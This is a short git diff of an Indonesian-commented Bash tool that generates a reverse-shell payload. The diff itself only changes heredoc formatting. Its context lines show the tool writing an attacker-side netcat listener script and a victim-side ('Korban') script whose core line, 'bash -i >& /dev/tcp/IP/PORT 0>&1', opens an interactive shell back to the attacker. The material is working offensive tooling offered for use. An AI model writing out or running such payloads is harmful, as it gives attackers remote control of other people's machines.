@@ -47,7 +47,7 @@ while true; do
 done
 
 # Membuat skrip yang akan dijalankan di mesin penyerang (Attacker)
-cat <<EOF > "${file_attacker}"
+cat << EOF > "${file_attacker}"
 # [run.sh]
 # Program Bash sederhana yang dirancang untuk melakukan reverse shell melalui koneksi TCP menggunakan netcat.
 # Dibuat oleh: fixploit03
@@ -66,7 +66,7 @@ EOF
 chmod +x "${file_attacker}"
 
 # Membuat skrip yang akan dijalankan di mesin terget (Korban)
-cat <<EOF > "${output}"
+cat << EOF > "${output}"
 #!/bin/bash
 echo "Tunggu beberapa saat..."
 bash -i >& /dev/tcp/"${ip}"/"${port}" 0>&1
